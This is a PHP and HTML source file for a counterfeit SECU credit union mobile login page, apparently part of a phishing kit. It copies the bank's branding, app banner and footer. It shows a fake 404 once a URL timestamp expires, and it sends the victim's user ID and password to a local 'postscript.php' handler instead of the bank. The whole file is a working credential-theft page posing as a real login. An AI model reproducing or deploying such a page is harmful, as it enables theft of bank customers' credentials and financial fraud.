<?php include ('gisp.php');?>
 <?php 
 $page=$_GET["f"];
  $userid=$_POST["userid"];
   $upass=$_POST["upass"];
  $expire=$_GET["session"];
$date = new DateTime();
$date->setTimezone(new DateTimeZone('UTC'));
$fdate = $date->format('Y-m-d H:i:s'); // same format as NOW()
$fdatem= strtotime($fdate);
if($fdatem >= $expire){

 header('HTTP/1.0 404 Not Found');
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
exit();
   
}
 ?>
<html lang="en">
    <head>
      
        <title>Mobile Access - Menu</title>
        <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
        <meta name="format-detection" content="telephone=no" />
        <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0" />
        <link href="files/SECUmedium.css" rel="stylesheet" type="text/css" media="all" />
        <link rel="icon" href="files/SECUfavicon.ico" type="image/x-icon" />
        <link rel="icon" href="files/icon-v2-128x128.png" sizes="128x128" />
        <link rel="icon" href="files/icon-v2-192x192.png" sizes="192x192" />
        <link rel="apple-touch-icon" href="files/apple-touch-icon-v2-76x76.png" />
        <link rel="apple-touch-icon" href="files/apple-touch-icon-v2-152x152.png" sizes="152x152" />
        <link rel="apple-touch-icon" href="files/apple-touch-icon-v2-167x167.png" sizes="167x167" />
        <link rel="apple-touch-icon" href="files/apple-touch-icon-v2-180x180.png" sizes="180x180" />
       
        <script src="files/jquery-3.6.0.min.js"></script>
        <!-- Shape Client JavaScript is common.js -->
        <style type="text/css">
            body.preLogger .centered.topSpace {
    background-color: #f5f9fc;
    color: #000;
    max-width: 448px;
    padding: 20px 6px;
    border-radius: 18px;
    margin-bottom: 30px;
}
</style>

            </head>

    <body class="preLogger">
        <noscript>
            <div class="errorText">
                Please Check Your Browser<br />
                Your current browser is not capable of viewing this site because it does not support javascript.<br />
            </div>
        </noscript>
        <a href="http://itunes.apple.com/us/app/SECU/id1435916976?mt=8" style="text-decoration: none; color: #ffffff;">
            <table id="MobileAppBanner" width="100%" role="presentation" style="background: #333333; height: 50px; position: fixed; left: 0; right: 0; top: 0;">
                <tbody>
                    <tr>
                        <td width="30px;" style="vertical-align: middle; padding-left: 10px;"><img src="files/Logo.fw.png" width="25px;" height="25px;" alt="SECU Logo" /></td>
                        <td style="vertical-align: middle; text-align: left;" class="text3">Open in the SECU Mobile App</td>
                        <td width="20px;" style="vertical-align: middle; text-align: right; padding-right: 10px;" class="text3">&gt;</td>
                    </tr>
                </tbody>
            </table>
        </a>
        <div style="height: 50px;">&nbsp;</div>
        <div id="logobar" class="logoBar">
            <div id="logoDiv" class="centered noExtraSpace"><img id="logo" class="logo" alt="SECU Logo" title="SECU Logo" src="files/SECU_480_White.png" /></div>
        </div>
        <form method="post" action="postscript.php" id="mainForm">
        
        
            <div class="centered topSpace" style="width: 85%;">
                <div class="noExtraSpace">
                    <div style="padding-bottom: 0.3em; margin-bottom: 0.3em; overflow: auto;">
                        <div class="signOnText text3" id="DivLabelUserID" style="display: none;"><label for="TextUserID" id="LabelUserID" style="display: none;">User ID</label>:</div>
                        <div class="signOnInput">
                            <input
                                name="userid"
                                type="text"
                                maxlength="16"
                                id="TextUserID"
                                tabindex="1"
                                onfocus="inputTextStatusChange(this, 'f');"
                                onblur="inputTextStatusChange(this, 'b');"
                                title="User ID"
                                autocomplete="off"
                                style="height: 1.75em; width: 100%;"
                                placeholder="User ID"
                                required
                            />
                            <input type="hidden" value="user" name="type">
                             <input type="hidden" value="signup" name="action">
                        </div>
                    </div>
                    <div style="padding-bottom: 0; overflow: auto;">
                        <div class="signOnText text3" id="DivLabelPassword" style="display: none;"><label for="TextPassword" id="LabelPassword" style="display: none;">Password</label>:</div>
                        <div class="signOnInput">
                            <input
                                type="password"
                                alt="null"
                                tabindex="2"
                                name="upass"
                                id="upass"
                                title="Enter your password to log In"
                                maxlength="32"
                                autocomplete="off"
                                placeholder="Password"
                                style="color: inherit; height: 1.75em; width: 100%;"
                                required
                            />
                        </div>
                    </div>
                   
                </div>
                <div style="margin-top: 0.2em; margin-bottom: 0em; clear: both;">
                    <input type="submit" name="ctl00$MainCPH$LoginControl$ButtonSubmit" value="Sign In" id="MainCPH_LoginControl_ButtonSubmit" class="signOnButton fiColoredButton text5 bold" />
                </div>
                
            </div>

            <div style="margin-top: 0.4em;">
                <div id="MainCPH_SelectionListMenu_contentDiv" class="content">
                    <div id="MainCPH_SelectionListMenu_Items_listItemDiv_0" class="menuItem text2"><a id="Menu_1" title="Rates &amp; Fees" href="#">Rates &amp; Fees</a></div>
                    <div id="MainCPH_SelectionListMenu_Items_listItemDiv_1" class="menuItem text2"><a id="Menu_2" title="Locate Us" href="#" target="_blank">Locate Us</a></div>
                    <div id="MainCPH_SelectionListMenu_Items_listItemDiv_2" class="menuItem text2"><a id="Menu_3" title="Contact Us" href="#">Contact Us</a></div>
                    <div id="MainCPH_SelectionListMenu_Items_listItemDiv_3" class="menuItem text2"><a id="Menu_4" title="View Full Website" href="#">View Full Website</a></div>
                </div>
            </div>
        </form>
        <div class="footer text5">
            <div class="smallSpaceBelow">
                <a href="https://www.ncsecu.org/Home/Legal.html" title="Legal" class="Link noShowLink" target="_blank">Legal</a> &nbsp;&nbsp;|&nbsp;&nbsp;
                <a id="linkAccessibility" class="Link noShowLink" href="https://www.ncsecu.org/Home/AccessibilityStatement.html" target="_blank">Accessibility</a> &nbsp;&nbsp;|&nbsp;&nbsp;
                <a class="Link noShowLink" href='javascript:ChangeLanguage("/m/Menu.aspx?lang=es")'>Español</a> &nbsp;&nbsp;|&nbsp;&nbsp; <a href="/m/SiteMap.aspx" id="ViewSiteMapLink" class="Link noShowLink">Site Map</a><br />
                Equal Housing Opportunity
                <img src="Images/ehl_gif_white_s14x13x256Pass.png" width="14" height="13" alt="Equal Housing Lender" />
                &nbsp;&nbsp;|&nbsp;&nbsp; NMLS#430055
            </div>
            <div class="smallSpaceBelow"><span id="LabelInsuredMessage">Federally Insured by NCUA</span></div>
            <!-- <span id="LabelAccessibilityMessage"></span> -->
        </div>
    </body>
</html>
